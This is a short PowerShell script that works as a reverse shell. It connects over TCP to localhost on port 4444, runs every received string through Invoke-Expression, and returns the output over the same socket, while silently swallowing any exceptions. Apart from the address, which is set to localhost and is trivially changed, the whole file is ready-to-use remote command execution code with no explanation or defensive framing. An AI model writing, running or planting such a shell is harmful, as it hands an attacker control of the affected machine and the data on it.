$addr = "localhost"
$port = 4444

$client = New-Object System.Net.Sockets.TcpClient ($addr, $port)
$stream = $client.GetStream()
$buffer = New-Object System.Byte[] $client.ReceiveBufferSize
$enc = New-Object System.Text.AsciiEncoding

try {
    while ($TRUE) {
        $bytes = $stream.Read($buffer, 0, $buffer.length)
        if ($bytes -eq 0) {
            break
        }
        $result = Invoke-Expression $enc.GetString($buffer, 0, $bytes) | Out-String
        $result = $enc.GetBytes($result)
        $stream.Write($result, 0, $result.length)
    }
} catch {
    # ignore exceptions
} finally {
    $stream.Close()
}

$client.Close()
